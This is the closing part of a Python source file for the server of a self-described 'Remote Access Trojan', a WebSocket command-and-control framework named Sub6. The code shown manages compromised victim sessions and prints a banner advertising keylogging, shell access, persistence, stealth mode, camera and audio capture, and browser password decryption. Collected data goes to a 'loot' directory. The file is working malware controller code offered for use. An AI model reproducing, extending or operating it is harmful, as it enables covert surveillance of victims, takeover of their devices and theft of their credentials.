            os_type = info.get('os_type', 'unknown')
            if os_type == 'windows':
                os_str = f"{MAGENTA}WIN{RESET}     "
            elif os_type == 'linux':
                os_str = f"{GREEN}LINUX{RESET}   "
            elif os_type == 'android':
                os_str = f"{GREEN}ANDROID{RESET} "
            else:
                os_str = f"{RED}???{RESET}     "
            
            print(f"{YELLOW}║{RESET}  {GREEN}{sid:<4}{RESET} {os_str} {WHITE}{comp:<16}{RESET}  {WHITE}{user:<14}{RESET}  {WHITE}{time_str:<10}{RESET}  {status}         {YELLOW}║{RESET}")
        
        print(f"{YELLOW}╚═══════════════════════════════════════════════════════════════════════════════╝{RESET}\n")
    
    def kill_session(self, session_id):
        """Kill a session"""
        RED = '\033[91m'
        CYAN = '\033[96m'
        RESET = '\033[0m'
        
        if session_id in self.sessions:
            # Clean up liveview if running for this session
            if self.liveview_session == session_id:
                self.liveview_session = None
                if session_id in self.liveview_frames:
                    del self.liveview_frames[session_id]
            
            # Clean up camview if running for this session
            if self.camview_session == session_id:
                self.camview_session = None
                if session_id in self.camview_frames:
                    del self.camview_frames[session_id]
            
            try:
                asyncio.create_task(self.sessions[session_id]['websocket'].close())
            except:
                pass
            del self.sessions[session_id]
            if self.active_session == session_id:
                self.active_session = None
            print(f"{RED}[*]{RESET} Session {CYAN}{session_id}{RESET} killed")
        else:
            print(f"{RED}[!]{RESET} Session {CYAN}{session_id}{RESET} not found")
    
    async def command_loop(self):
        """Handle server commands with proper async notification support"""
        # Use patch_stdout to safely print notifications while user is typing
        # This saves input buffer, prints notification, then restores prompt + buffer
        with patch_stdout():
            while self.running:
                try:
                    # Get current prompt
                    prompt = self.server_prompt()
                    
                    # Use prompt_toolkit's async prompt - handles notifications cleanly
                    cmd = await self.prompt_session.prompt_async(prompt)
                    cmd = cmd.strip()
                    
                    if not cmd:
                        continue
                    
                    parts = cmd.split()
                    
                    if parts[0] == 'sessions':
                        if len(parts) == 1 or (len(parts) == 2 and parts[1] == '-l'):
                            self.list_sessions()
                        elif len(parts) == 3 and parts[1] == '-i':
                            try:
                                sid = int(parts[2])
                                await self.interact(sid)
                            except ValueError:
                                print("[!] Invalid session ID")
                        elif len(parts) == 3 and parts[1] == '-k':
                            try:
                                sid = int(parts[2])
                                self.kill_session(sid)
                            except ValueError:
                                print("[!] Invalid session ID")
                        else:
                            print("Usage: sessions [-l|-i <id>|-k <id>]")
                    
                    elif parts[0] in ['exit', 'quit']:
                        print("\n[*] Shutting down...")
                        self.running = False
                        break
                    
                    elif parts[0] == 'help':
                        CYAN = '\033[96m'
                        GREEN = '\033[92m'
                        YELLOW = '\033[93m'
                        WHITE = '\033[97m'
                        RESET = '\033[0m'
                        print(f"\n{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
                        print(f"                    {CYAN}Server Commands{RESET}")
                        print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}")
                        print(f"  {GREEN}sessions{RESET}             - List all sessions")
                        print(f"  {GREEN}sessions -i <id>{RESET}     - Interact with session")
                        print(f"  {GREEN}sessions -k <id>{RESET}     - Kill session")
                        print(f"  {GREEN}clear{RESET}                - Clear screen")
                        print(f"  {GREEN}help{RESET}                 - Show this help")
                        print(f"  {GREEN}exit/quit{RESET}            - Exit server")
                        print(f"{YELLOW}═══════════════════════════════════════════════════════════{RESET}\n")
                    
                    elif parts[0] == 'clear' or parts[0] == 'cls':
                        self.clear_screen()
                        self.print_banner()
                    
                    else:
                        print(f"[!] Unknown command: {cmd}")
                        print("Type 'help' for available commands")
                    
                except KeyboardInterrupt:
                    print("\n\n[*] Use 'exit' to shut down")
                except EOFError:
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
    
    def print_banner(self):
        """Print ASCII banner"""
        # ANSI color codes
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        RESET = '\033[0m'
        
        print()
        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
        print(f"{RED}|                                                                      |{RESET}")
        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB    6666{RESET}                         {RED}|{RESET}")
        print(f"{RED}|{RESET}                   {CYAN}{BOLD}S      U   U  B   B  6    {RESET}                         {RED}|{RESET}")
        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  U   U  BBBB   6666 {RESET}                         {RED}|{RESET}")
        print(f"{RED}|{RESET}                   {CYAN}{BOLD}    S  U   U  B   B  6   6{RESET}                         {RED}|{RESET}")
        print(f"{RED}|{RESET}                   {CYAN}{BOLD}SSSSS  UUUUU  BBBB    666 {RESET}                         {RED}|{RESET}")
        print(f"{RED}|                                                                      |{RESET}")
        print(f"{RED}|{RESET}                  {YELLOW}   [ Remote Access Trojan ]{RESET}                         {RED}|{RESET}")
        print(f"{RED}|                                                                      |{RESET}")
        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
        print(f"{RED}|{RESET}   {WHITE}Author{RESET}  : {GREEN}Subodh{RESET}                                                   {RED}|{RESET}")
        print(f"{RED}|{RESET}   {WHITE}Version{RESET} : {GREEN}1.0{RESET}                                                      {RED}|{RESET}")
        print(f"{RED}|{RESET}   {WHITE}Type{RESET}    : {GREEN}WebSocket C2 Framework{RESET}                                   {RED}|{RESET}")
        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Keylogger        {MAGENTA}[+]{RESET} Screenshot        {MAGENTA}[+]{RESET} File Transfer       {RED}|{RESET}")
        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Shell Access     {MAGENTA}[+]{RESET} Persistence       {MAGENTA}[+]{RESET} Process List        {RED}|{RESET}")
        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Auto Reconnect   {MAGENTA}[+]{RESET} Stealth Mode      {MAGENTA}[+]{RESET} Multi-Session       {RED}|{RESET}")
        print(f"{RED}|{RESET}   {MAGENTA}[+]{RESET} Live View        {MAGENTA}[+]{RESET} Camera View       {MAGENTA}[+]{RESET} Audio Recording     {RED}|{RESET}")
        print(f"{RED}+----------------------------------------------------------------------+{RESET}")
        print()
    
    async def start(self):
        """Start the WebSocket server"""
        self.print_banner()
        
        GREEN = '\033[92m'
        CYAN = '\033[96m'
        YELLOW = '\033[93m'
        RESET = '\033[0m'
        
        print(f"{GREEN}[*]{RESET} WebSocket server: {CYAN}ws://{self.host}:{self.port}{RESET}")
        print(f"{GREEN}[*]{RESET} Loot directory: {CYAN}./loot/{RESET}")
        print(f"{YELLOW}[*]{RESET} Waiting for connections...")
        print(f"{YELLOW}[*]{RESET} Type {CYAN}'help'{RESET} for available commands\n")
        
        async with websockets.serve(
            self.handle_client, 
            self.host, 
            self.port, 
            max_size=100*1024*1024,
            ping_interval=30,
            ping_timeout=120,
            close_timeout=30,
            max_queue=None,
            compression=None
        ):
            await self.command_loop()

if __name__ == "__main__":
    import argparse
    
    # Check for browser decryption dependencies
    if not CRYPTO_AVAILABLE:
        print(f"\033[93m[!] Browser password decryption unavailable - install: pip install pycryptodomex\033[0m")
    if not WIN32CRYPT_AVAILABLE:
        print(f"\033[93m[!] Browser password decryption unavailable - install: pip install pywin32\033[0m")
    if CRYPTO_AVAILABLE and WIN32CRYPT_AVAILABLE:
        print(f"\033[92m[+] Browser password decryption enabled\033[0m")
    
    parser = argparse.ArgumentParser(description='Sub6 Payload - WebSocket C2 Framework')
    parser.add_argument('-p', '--port', type=int, default=8080, 
                       help='Port to listen on (default: 8080)')
    parser.add_argument('-H', '--host', default='0.0.0.0', 
                       help='Host to bind to (default: 0.0.0.0)')
    
    args = parser.parse_args()
    
    server = WebSocketServer(host=args.host, port=args.port)
    
    try:
        asyncio.run(server.start())
    except KeyboardInterrupt:
        print("\n\033[91m[!]\033[0m Server stopped by user")
    except Exception as e:
        print(f"\033[91m[!]\033[0m Server error: {e}")
        